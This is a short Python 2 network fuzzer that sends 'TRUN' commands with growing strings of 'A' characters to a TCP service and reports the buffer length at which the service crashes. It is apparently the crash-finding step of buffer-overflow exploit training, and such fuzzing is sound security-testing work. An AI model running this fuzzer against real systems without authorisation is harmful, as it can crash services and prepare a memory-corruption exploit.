import socket
import sys

try:
	ip = sys.argv[1]
	port = int(sys.argv[2])
	lbound = int(sys.argv[3])
	ubound	 = int(sys.argv[4])
	inc = int(sys.argv[5])
except:
	print "  USAGE: python fuzzer.py <IP> <PORT> <LOWER BOUND> <UPPER BOUND> <INCREMENT>"
	print "EXAMPLE: tpython fuzzer.py 192.168.1.1 1234 500 2000 5"
	print "\t This will try string lengths between 500 and 2000 in increments of 5"
	exit()

try:
	for i in range(lbound, ubound, inc):
		conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		conn.settimeout(5)
		conn.connect((ip, port))
		data=conn.recv(4096)
		badbuf = "A" * i
		conn.send("TRUN .%s\r\n" % badbuf)	
		data=conn.recv(4096)
		conn.close()
except:
	print "******************************"
	print "CRASH DETECTED - Length: %i" % i
	print "******************************"
